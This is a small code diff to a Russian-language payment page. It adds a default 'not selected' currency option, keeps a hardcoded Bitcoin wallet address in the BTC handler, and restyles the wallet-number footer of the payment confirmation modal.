@@ -262,7 +262,7 @@
                                 <div class="media-wrapper" style='margin-bottom: 30px;'>
                                     <div class="archives-widget">
                                         <div class="select" tabindex="1" style='margin: 0;'>
-                                            <input class="selectopt" name="currency" type="radio" id="opt1" value='none' checked>
+                                            <input class="selectopt" name="currency" type="radio" id="opt1" value='none' onchange='none()' checked>
                                             <label for="opt1" class="option">Валюта</label>
                                             <input class="selectopt" name="currency" type="radio" id="opt2" value='btc' onchange='btc()' required>
                                             <label for="opt2" class="option" name='valute'>BTC (Legacy)</label>
@@ -351,8 +351,12 @@ if(luhnAlgorithm(num) == true && num !== '' && num.length >= 15) {
 })
 }
 }
-var pay_money;
-function btc() {
+var pay_money = 'Не выбрана';
+function none() {
+    pay_money = 'Не выбрана';
+    return pay_money;
+}
+function btc(e) {
     pay_money = '1EoKrTM5dCspZt9cFkc454pFUZgmJeTJii';
     return pay_money;
 }
@@ -441,11 +445,10 @@ function pay() {
         html: 'Вам дано 19 минут, чтобы совершить транзакцию. <br><br>Сумма транзакции: ' + price + '<br>Банковская организация: ' + bank_name,
         text: 'текст',
         confirmButtonText: 'Оплата произведена',
-        footer: 'Номер кошелька: ' + pay_money,
+        footer: '<p style="font-size:15px;text-align:center;">Номер кошелька:<br>' + pay_money,
         showDenyButton: true,
         denyButtonText: `Отменить`
         }).then((result) => {
-        /* Read more about isConfirmed, isDenied below */
         if (result.isConfirmed) {
         Swal.fire('Отлично!', 'Осталось нажать "Завершить транзакцию."', 'success')
         }
